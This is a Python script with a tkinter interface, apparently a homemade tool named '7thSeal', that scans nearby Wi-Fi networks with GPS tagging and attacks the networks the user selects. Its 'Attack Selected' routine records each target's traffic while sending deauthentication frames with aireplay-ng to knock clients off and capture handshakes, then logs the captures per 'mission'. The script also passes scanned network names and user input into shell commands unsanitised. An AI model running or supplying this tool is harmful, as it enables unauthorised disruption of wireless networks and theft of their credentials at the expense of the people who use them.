#!/usr/bin/python3
#!/usr/bin/env python3
"""
This program is made to get the bad boi wifi
Dev: Surgat

                                                     @#@@@@@@@#@
                                                &@@,@           @,@@&
                                             @@.                     ,@@
                                           @&                           @@
                                         %@
                                        &@
                                        @
                                       &@
                @@@@@@                 &@
            .@@*      @@&              &@
          *@             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
         /@                            &@
         &@                            &@
         .@                            &@
           @&           .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
             #@@%,   @@@               &@
                  @@@@                 &@
                                       &@
                                       &@                                     %@@
                                       &@                  @@                    @*
                                       &@                 @. @*                  #@
                                       &@               ,@.   @#                .@,
                                       &@@@@@@@@@@@@@@@/@@@@@@@@&@@@@@@@@@@@@@@@@#
                                                      #@        @@
                                                     @@          &@
                                                    @@            (@
                                                    @%@@@@@@@@@@@@@@@
"""
import tkinter as tk
import os
import sys
import time
from time import gmtime, strftime
Interface = os.popen('ip a|grep w |awk -F : \'{print $2}\'').read()
BSSIDS=[]
mission =""
interswitch=""
def Logit(nm):
	nm = nm.replace(" ","")
	logname = strftime("%a,%d-%b-%Y_%H:%M",gmtime())
	logged = (logname + nm)
	os.system('mkdir /etc/7thseal/logs/' + nm)
	os.system('mv /etc/7thseal/breacher-01.csv  /etc/7thseal/logs/'+nm+'/'+logged+'.csv')
	os.system('mv /etc/7thseal/breacher-01.gps  /etc/7thseal/logs/'+nm+'/'+logged+'.gps')
def Scan():
	os.system('rm /etc/7thseal/breacher-01.csv 2> /dev/null')
	os.system('rm /etc/7thseal/breacher-01.gps 2> /dev/null')
	os.system('mkdir /etc/7thseal 2> /dev/null')
	os.system('mkdir /etc/7thseal/logs 2> /dev/null')
	global BSSIDS
	global Interface
	os.system('xgps &')
	os.system('xterm -title \"7thsealSCAN\" -e airodump-ng --gpsd --band abg -w /etc/7thseal/breacher --output-format csv '+ Interface)
	os.system('ps -elf |grep xgps|head -1|awk \'{print $4}\'|xargs kill')
	time.sleep(5)
	breacher = open("/etc/7thseal/breacher-01.csv","r")
	uniq=[]
	for i in breacher:
		i = i.split(", ")
		if len(i) < 3:
			continue
		else:
			z = str(i[0]) + "--->" + str(i[len(i)-2] + "--->"+ str(i[3]))
			x = str(i[0])
			if x not in uniq:
				uniq.append(x)
				BSSIDS.append(z)
			elif x == "\n":
				break
	breacher.close
	BSSIDS.pop(-(len(BSSIDS)-1))
	Results()
def Survey():
	global Interface
	global mission
	os.system('xgps &')
	os.system('xterm -title \"7thsealSurvey\" -e airodump-ng --gpsd --band abg -w /etc/7thseal/logs/'+mission+' --output-format csv '+ Interface)
	os.system('ps -elf |grep xgps|head -1|awk \'{print $4}\'|xargs kill')
def Menu():
	global Interface
	global mission
	global interswitch
	seal = tk.Tk()
	seal.title("7thSeal")
	x = 0
	face = tk.Listbox(seal,width=20,height=5,selectmode="single")
	Interface = Interface.split()
	for i in Interface:
		face.insert(tk.END,i)
	def setINT():
		global Interface
		for i in face.curselection():
			Interface = face.get(i)
		os.system('airmon-ng start ' + Interface )
		Interface = os.popen('ip a|grep mon |awk -F : \'{print $2}\'').read()
	face.grid(row =1, column=1)
	setinterface = tk.Button(seal,text="Set the interface",command=setINT)
	setinterface.grid(row=1,column=2)
	WifiScan = tk.Button(seal,text="Scan",width=25,height=5,bg="black",fg="white",command=Scan)
	WifiSurvey = tk.Button(seal,text="Survey",width=25,height=5,bg="black",fg="white",command=Survey)
	WifiScan.grid(row=3,column=3)
	WifiSurvey.grid(row=3,column=4)
	missionnme = tk.Entry(seal)
	missionnme.grid(row=2,column=2)
	def getmis():
		global mission
		mission = missionnme.get()
	mis = tk.Button(seal,text="Submit Mission Name",command=getmis)
	mis.grid(row=2,column=3)
	seal.mainloop()
def Results():
	global BSSIDS
	popout = tk.Tk()
	popout.title("7thSeal")
	Res = tk.Listbox(popout,width=60,height=50,selectmode="multiple")
	for i in BSSIDS:
		Res.insert(tk.END, i)
	def Attack():
		global Interface
		global mission
		for i in Res.curselection():
			z=Res.get(i)
			z = z.split("--->")
			target=str(z[0])
			essid=str(z[1])
			ch=str(z[2])
			essids =essid.replace(" ","")
			print("Now attacking",essid)
			time.sleep(2)
			print('/etc/7thseal/'+essids)
			os.system('(xterm -title \"AllHearing\" -e airodump-ng -c '+ch+' --bssid '+ target +' -w /etc/7thseal/'+essids+' --output-format pcap'+Interface+')&' )
			time.sleep(10)
			print("Sending DeAuth at",essid)
			os.system('aireplay-ng -0 5 -a '+target+' '+ Interface)
			time.sleep(15)
			os.system('ps -elf|grep xterm|awk \'{print $4}\'|xargs kill')
			Logit(mission)
			os.system('mv /etc/7thseal/'+essids+'-01.cap /etc/7thseal/logs/'+mission+'/')
			print("Moving to next target")
			time.sleep(2)
	attack = tk.Button(popout,text="Attack Selected",command=Attack)
	attack.grid(row=4,column=4)
	Res.grid(row=0,column=0)
	popout.mainloop()
def main():
	global mission
	Menu()
	Logit(mission)
	os.system('airmon-ng stop '+ Interface + ' 1> /dev/null')
if __name__ == '__main__':
    main()

